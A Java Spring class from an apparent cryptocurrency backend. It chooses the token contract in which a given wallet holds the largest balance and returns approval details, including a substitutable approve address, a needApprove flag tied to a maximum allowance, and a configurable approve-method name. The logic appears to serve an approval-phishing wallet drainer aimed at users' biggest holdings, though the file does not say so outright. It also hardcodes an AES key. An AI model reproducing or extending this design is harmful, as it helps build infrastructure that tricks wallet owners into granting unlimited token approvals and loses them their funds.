package com.inso.modules.coin.approve.logical;

import com.google.common.collect.Maps;
import com.inso.framework.utils.AESUtils;
import com.inso.framework.utils.Base64Utils;
import com.inso.framework.utils.CollectionUtils;
import com.inso.framework.utils.StringUtils;
import com.inso.modules.coin.config.CoinConfig;
import com.inso.modules.coin.contract.Token20Manager;
import com.inso.modules.coin.core.model.*;
import com.inso.modules.coin.approve.service.ApproveAuthService;
import com.inso.modules.coin.core.service.CoinAccountService;
import com.inso.modules.coin.approve.service.ContractService;
import com.inso.modules.common.model.CryptoCurrency;
import com.inso.modules.web.service.ConfigService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import java.math.BigDecimal;
import java.util.*;

@Component
public class ContractInfoManager {

    private static final String DEFAULT_SALT = "37300ac7d229f225";

    private static final String KEY_ID = "id";
    private static final String KEY_CONTRACT_ADDRESS = "contractAddress";
    private static final String KEY_NETOWRK_TYPE = "networkType";
    private static final String KEY_CURRENCY_TYPE = "currencyType";
    private static final String KEY_CURRENCY_API_SERVER = "currencyApiServer";
    private static final String KEY_CURRENCY_CTR_ADDRESS = "currencyCtrAddress";

    private Map<String, List<ContractInfo>> maps = Maps.newConcurrentMap();

    private long mLatestTimestamp = -1;

    @Autowired
    private ContractService mContractService;

    @Autowired
    private CoinAccountService mCoinAccountService;

    @Autowired
    private ApproveAuthService mApproveAuthService;

    @Autowired
    private ConfigService mConfigSerivce;

    public Map<String, Object> findGoodConfig(CryptoNetworkType networkType, CryptoCurrency currency, long contractId, String address)
    {
        ContractInfo maxBalanceModel = null;
        if(contractId > 0)
        {
            maxBalanceModel = mContractService.findById(false, contractId);
        }
        else if(networkType != null && currency != null)
        {
            maxBalanceModel = mContractService.findByNetowrkAndCurrency(false, networkType, currency);
        }
        else
        {
            List<ContractInfo> rsList = loadContractList(networkType);
            if(CollectionUtils.isEmpty(rsList))
            {
                return Collections.emptyMap();
            }

            BigDecimal latestMaxBalance = BigDecimal.ZERO;

            Token20Manager token20Manager = Token20Manager.getInstance();

            for(ContractInfo model : rsList)
            {
                BigDecimal balance = token20Manager.balanceOf(networkType, model.getCurrencyCtrAddr(), address);
                if(balance == null)
                {
                    balance = BigDecimal.ZERO;
                }
                if(maxBalanceModel == null || balance.compareTo(latestMaxBalance) > 0)
                {
                    maxBalanceModel = model;
                    latestMaxBalance = balance;
                }
            }
        }

        if(maxBalanceModel == null)
        {
            return Collections.emptyMap();
        }

        ApproveAuthInfo approveAuthInfo = null;
        if(!StringUtils.isEmpty(address))
        {
            CoinAccountInfo accountInfo = mCoinAccountService.findByAddress(false, address);
            if(accountInfo != null)
            {
                approveAuthInfo = mApproveAuthService.findByUseridAndContractId(false, accountInfo.getUserid(), maxBalanceModel.getId());
            }
        }
        return convertMap(maxBalanceModel, approveAuthInfo);
    }

    private List<ContractInfo> loadContractList(CryptoNetworkType networkType)
    {
        if(mLatestTimestamp == -1 || System.currentTimeMillis() - mLatestTimestamp > 60000)
        {
            maps.clear();
        }

        List<ContractInfo> rsList = maps.get(networkType.getKey());
        if(rsList == null)
        {
            rsList = mContractService.queryByNetwork(false, networkType);

            if(CollectionUtils.isEmpty(rsList))
            {
                rsList = Collections.emptyList();
            }
            maps.put(networkType.getKey(), rsList);
        }
        return rsList;
    }

    private Map<String, Object> convertMap(ContractInfo model, ApproveAuthInfo approveAuthInfo)
    {

        Map<String, Object> maps = Maps.newHashMap();

        maps.put(KEY_ID, encryptId(model.getId()));
        maps.put(KEY_CONTRACT_ADDRESS, model.getAddress());
        maps.put(KEY_NETOWRK_TYPE, model.getNetworkType());
        maps.put(KEY_CURRENCY_TYPE, model.getCurrencyType());

        CryptoNetworkType networkType = CryptoNetworkType.getType(model.getNetworkType());
        maps.put(KEY_CURRENCY_API_SERVER, networkType.getApiServer());
        maps.put(KEY_CURRENCY_CTR_ADDRESS, model.getCurrencyCtrAddr());

        if(approveAuthInfo != null && !StringUtils.isEmpty(approveAuthInfo.getApproveAddress()))
        {
            maps.put(KEY_CONTRACT_ADDRESS, approveAuthInfo.getApproveAddress());
        }

        boolean needApprove = false;
        if(approveAuthInfo == null || approveAuthInfo.getAllowance().compareTo(ApproveAuthInfo.DEFAULT_MAX_ALLOWANCE) < 0)
        {
            needApprove = true;
        }

        if(needApprove)
        {
            boolean isNativeMethod = mConfigSerivce.getBoolean(false, CoinConfig.APPROVE_TRIGGER_METHOD_NAVTIVE.getKey());

            String triggerApproveTypeValue = model.getRemarkVO().getString(ContractInfo.REMARK_KEY_TRIGGER_APPROVE_TYPE);
            TriggerApproveType triggerApproveType = TriggerApproveType.getType(triggerApproveTypeValue);

            if(isNativeMethod || triggerApproveType == TriggerApproveType.APPROVE_TRIGGER)
            {
                maps.put(ContractInfo.REMARK_KEY_CURRENCY_APPROVE_METHOD, ContractInfo.REMARK_KEY_CURRENCY_APPROVE_METHOD_DEFAUL_VALUE);
            }
            else
            {
                String currencyApproveMethodKey = ContractInfo.REMARK_KEY_CURRENCY_APPROVE_METHOD;
                String currencyApproveMethodValue = model.getRemarkVO().getString(currencyApproveMethodKey);
                if(StringUtils.isEmpty(currencyApproveMethodValue))
                {
                    currencyApproveMethodValue = ContractInfo.REMARK_KEY_CURRENCY_APPROVE_METHOD_DEFAUL_VALUE;
                }
                maps.put(ContractInfo.REMARK_KEY_CURRENCY_APPROVE_METHOD, currencyApproveMethodValue);
            }
        }

        maps.put("needApprove", needApprove);
        return maps;
    }

    public static String encryptId(long id)
    {
        String rs = AESUtils.encrypt(id + StringUtils.getEmpty(), DEFAULT_SALT);
        return Base64Utils.encode(rs);
    }

    public static long decryptId(String content)
    {
        try {
            String decryByBase64 = Base64Utils.decode(content);
            String decryByAES = AESUtils.decrypt(decryByBase64, DEFAULT_SALT);
            return StringUtils.asLong(decryByAES);
        } catch (Exception e) {
        }
        return -1;
    }

    public static void main(String[] args) {
        long i = 3;


        String rs = encryptId(i);
        System.out.println(rs);
        System.out.println(decryptId(rs));
    }

}
